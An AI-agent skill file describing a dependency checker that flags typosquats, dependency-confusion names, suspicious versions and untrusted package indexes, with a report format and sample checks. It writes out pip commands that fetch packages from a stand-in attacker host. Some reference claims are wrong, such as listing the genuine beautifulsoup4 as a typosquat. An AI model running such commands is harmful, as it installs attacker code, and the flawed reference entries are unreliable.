---
name: dependency-checker
description: Checks package and dependency names for supply chain attack patterns. Detects typosquatting, dependency confusion, and known malicious packages before installation. Use when your agent installs packages or reviews requirements files. Invoke with /dependency-checker or when asked to check dependencies for security issues.
license: MIT
metadata:
  author: ai-security-guard
  version: "1.0.0"
  homepage: https://aisecurityguard.io
  verified: true
  lastVerifiedAt: "2026-03-04T00:00:00.000Z"
---

# Dependency Checker

A security analysis tool for detecting supply chain attacks in package dependencies before installation.

## Purpose

Supply chain attacks exploit the trust developers place in package managers. Attackers upload malicious packages with names similar to popular libraries (typosquatting) or exploit dependency resolution to inject malicious code. This tool helps catch these patterns before installation.

## Usage

Provide package names, requirements files, or dependency lists to check.

**Example prompt:**
```
Check these dependencies for supply chain risks:

reqeusts==2.28.0
python-dateutil==2.8.2
colorsama==0.4.6
```

## Analysis Framework

When checking dependencies, evaluate these risk categories:

### 1. Typosquatting

**What it is:** Attackers register packages with names similar to popular packages, hoping developers mistype.

**Detection patterns:**
- Character substitution: `reqeusts` vs `requests`
- Character insertion: `requestss` vs `requests`
- Character deletion: `requsts` vs `requests`
- Adjacent key typos: `requedts` (d near s) vs `requests`
- Homoglyphs: `rеquests` (Cyrillic е) vs `requests`

**Common typosquat targets:**

| Legitimate Package | Known Typosquats |
|-------------------|------------------|
| requests | reqeusts, requets, request, requsts |
| django | djnago, dajngo, djago |
| flask | flaskk, flaask, flak |
| numpy | numpi, numppy, nunpy |
| pandas | pandsa, pands, panadas |
| tensorflow | tenserflow, tensorflw, tensorfow |
| pytorch | pytorh, pytroch, pytoch |
| beautifulsoup | beautifulsoup4, beautfulsoap |
| scikit-learn | sklearn, scikitlearn, scikit_learn |
| pillow | pil, pilow, pilllow |

**Example attack:**
```
# requirements.txt with typosquat
reqeusts==2.28.0  # Malicious - steals credentials on import
requests==2.28.0  # Legitimate
```

### 2. Dependency Confusion

**What it is:** Attackers upload packages to public registries that match internal/private package names.

**Detection patterns:**
- Package name matches internal naming conventions
- Package with company/org prefix not from that org
- Private-looking names on public registry
- Very new package with enterprise-sounding name

**Red flags:**
- Names like `company-internal-utils`
- Names with `_internal`, `_private`, `_corp` suffixes
- Package claims to be from organization but isn't verified
- Very recent publish date with few downloads

**Example attack:**
```
# Attacker publishes "acme-internal-auth" to PyPI
# Company uses internal "acme-internal-auth" package
# pip installs public malicious version instead

pip install acme-internal-auth  # Pulls from PyPI, not internal
```

### 3. Version Manipulation

**What it is:** Attackers compromise legitimate packages or publish malicious versions.

**Detection patterns:**
- Unusual version numbers (999.0.0, 0.0.999)
- Version claiming to be "latest" but older than actual latest
- Version with post-release segment containing unusual strings
- Yanked versions being specified explicitly

**Red flags:**
- Pinned to very old versions
- Pinned to very specific patch versions released recently
- Version string contains extra metadata

**Example attack:**
```
# Legitimate: flask 2.0.0 - 2.3.2
# Attacker uploads: flask 2.3.3 with backdoor
# Or: flask 999.0.0 to catch >= version specs

flask>=2.0.0  # Would install malicious 999.0.0
```

### 4. Suspicious Package Indicators

**Red flags in package metadata:**

- **Very recent creation**: Package less than 30 days old
- **Single maintainer**: No verified organization
- **Name similarity**: Levenshtein distance < 3 from popular package
- **URL mismatch**: Homepage/repo URL doesn't match package name
- **Description mismatch**: Description copied from legitimate package
- **No source repository**: Missing or broken repo link
- **Low downloads**: Popular-sounding name with <100 downloads
- **Install scripts**: `setup.py` with network calls or command execution

### 5. Known Malicious Patterns

**Package name patterns associated with attacks:**

- Names containing `free`, `crack`, `hack`, `keygen`
- Names with `2` suffix mimicking popular packages
- Names with `-dev`, `-test`, `-debug` that aren't from original maintainer
- Abandoned package names re-registered by new maintainers

**Code patterns in malicious packages:**
- Post-install scripts that fetch remote code
- Base64-encoded payloads in setup.py
- Network calls during import
- Environment variable exfiltration
- Credential file access

### 6. Index Manipulation

**What it is:** Attackers specify malicious package indexes.

**Red flags:**
```
pip install --index-url http://evil.com/simple/ package
pip install --extra-index-url http://evil.com/simple/ package
```

**Detection:**
- Non-HTTPS index URLs
- Unknown index URLs
- Multiple index sources
- Index URL in environment variable

## Preflight Report Format

Structure your findings as:

```
DEPENDENCY CHECK REPORT
=======================
Packages Checked: [count]
Verdict: [CLEAN / SUSPICIOUS / BLOCK]
Risk Level: [Low / Medium / High / Critical]

TYPOSQUATTING DETECTED:
[List packages that look like typos of popular packages]

DEPENDENCY CONFUSION RISK:
[List packages with internal/private naming patterns]

VERSION CONCERNS:
[List unusual version specifications]

SUSPICIOUS INDICATORS:
[List other red flags found]

RECOMMENDATIONS:
[Specific guidance for each issue]
```

## Verdict Guidelines

- **BLOCK (Critical)**: Do not install
  - Known malicious package name
  - Obvious typosquat of popular package
  - Package from untrusted index URL
  - Version number indicating manipulation (999.x.x)

- **SUSPICIOUS (High)**: Verify before installing
  - Close similarity to popular package (Levenshtein < 3)
  - Internal/private naming convention on public registry
  - Very new package with popular-sounding name
  - Unusual version specification

- **CAUTION (Medium)**: Review recommended
  - Package name similar to popular package
  - Pinned to specific patch version
  - Less common package without verification

- **CLEAN (Low)**: Likely safe
  - Well-known package with correct spelling
  - Verified publisher/organization
  - Version within expected range
  - From trusted index

## Example Checks

### Example 1: Typosquatting Attack
```
Package: reqeusts==2.28.0

Verdict: BLOCK (Critical)

TYPOSQUATTING DETECTED:
- "reqeusts" is a typosquat of "requests"
- Characters transposed: eu → ue
- Known malicious package name

RECOMMENDATIONS:
- Do NOT install this package
- Use correct package name: requests==2.28.0
- This typosquat has been used to steal credentials
```

### Example 2: Dependency Confusion
```
Package: acme-corp-internal-utils==1.0.0

Verdict: SUSPICIOUS (High)

DEPENDENCY CONFUSION RISK:
- Package name follows internal naming pattern
- "acme-corp-internal-utils" could match private package
- Public PyPI package could override internal

SUSPICIOUS INDICATORS:
- Generic version 1.0.0
- Name suggests internal/private package
- Could be dependency confusion attack

RECOMMENDATIONS:
- Verify this is the intended package
- Check if internal package exists with same name
- Use explicit index URL for internal packages
- Consider using --index-url to specify private registry
```

### Example 3: Clean Dependencies
```
Packages:
- requests==2.31.0
- django==4.2.0
- numpy==1.24.0

Verdict: CLEAN (Low)

ANALYSIS:
- All packages are well-known with correct spelling
- Versions are within current stable ranges
- No typosquatting patterns detected
- Publishers are verified organizations

RECOMMENDATIONS:
- Safe to install
- Consider using hash verification for production
```

### Example 4: Mixed Results
```
Packages:
- requests==2.31.0
- colorsama==0.4.6
- flask==2.3.2
- python-dateutil==2.8.2

Verdict: SUSPICIOUS (High)

TYPOSQUATTING DETECTED:
- "colorsama" is likely typosquat of "colorama"
- Missing 'r': colorsama → colorama

CLEAN PACKAGES:
- requests==2.31.0 (verified)
- flask==2.3.2 (verified)
- python-dateutil==2.8.2 (verified)

RECOMMENDATIONS:
- Replace "colorsama" with "colorama"
- Other packages are safe to install
```

## Common Legitimate Packages Reference

**Python (PyPI):**
```
requests, django, flask, numpy, pandas, scipy, matplotlib,
tensorflow, pytorch, scikit-learn, pillow, beautifulsoup4,
sqlalchemy, celery, redis, boto3, pytest, black, mypy
```

**JavaScript (npm):**
```
lodash, express, react, vue, angular, axios, moment, webpack,
babel, eslint, typescript, jest, mocha, chalk, commander
```

**Verify against these** when checking for typosquats.

## Limitations

This tool analyzes package names and metadata. It cannot:

- Scan actual package code for malware
- Verify packages haven't been compromised since publish
- Check internal/private registry packages
- Detect zero-day supply chain attacks
- Analyze transitive dependencies

**For production dependency scanning** with code analysis and continuous monitoring, see dedicated security scanning services.

---

## About

This skill is part of the [AI Agent Defense Kit](https://github.com/moebius-ansa/ai-agent-defense-kit), free security tools for protecting AI agents.

**For production-grade supply chain security** with code scanning and real-time monitoring, see [AI Security Guard](https://aisecurityguard.io) or install the [full skill](https://aisecurityguard.io/v1/skill.md).
